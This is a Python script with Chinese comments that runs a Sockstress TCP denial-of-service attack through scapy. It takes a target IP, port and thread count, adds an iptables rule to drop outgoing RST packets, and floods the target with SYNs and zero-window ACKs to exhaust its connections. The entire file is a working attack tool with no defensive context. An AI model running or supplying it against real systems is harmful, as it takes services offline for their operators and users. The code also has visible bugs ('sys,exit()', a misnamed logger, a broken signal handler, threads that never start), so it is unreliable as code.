#!/usr/bin/env python 
# -*- coding:utf-8 -*-

from scapy.all import *
from time import sleep
import threading
import logging
import os
import signal
import sys
logging.getLogger("acapy.runtime").setLevel(logging.ERROR)

if len(sys.argv) !=4:
    print("请输入正确的格式！")
    print("正确的格式为：ip 端口 线程数")
    sys.exit()

target=str(sys.argv[1])
dstport=int(sys.argv[2])
threads=int(sys.argv[3])


# 添加iptables规则
os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d' + target + ' -j DROP')

#攻击函数
def sockstress(target,dstport):
    while True:
        try:
            x=random.randint(0,65535)
            response=sr1(IP(dst=target)/TCP(sport=x,dport=dstport,flags='S'),timeout=1,verbose=0)
            send(IP(dst=target)/TCP(dport=dstport,sport=x,window=0,flags='A',ack=(response[TCP].seq+1))/'\x00\x00',verbose=0)
        except Exception as e:
            print("%s"%e)

#停止攻击函数
def shutdown():
    print("正在恢复iptables的规则")
    os.system('iptables -D OUTPUT -p tcp --tcp-flags RST RST -d'+target+' -j DROP')
    sys,exit()

signal.signal(signal.SIGINT,shutdown)

# while True:
#     sleep(1)

def main():
    # 多线程
    print("攻击中》》》》》》》》")
    thread_list=[]
    for y in range(0, threads):
        th = threading.Thread(sockstress(target, dstport))
        thread_list.append(th)
    for th in thread_list:
        th.setDaemon(True)
        th.start()
        th.join()


if __name__ == '__main__':
    main()
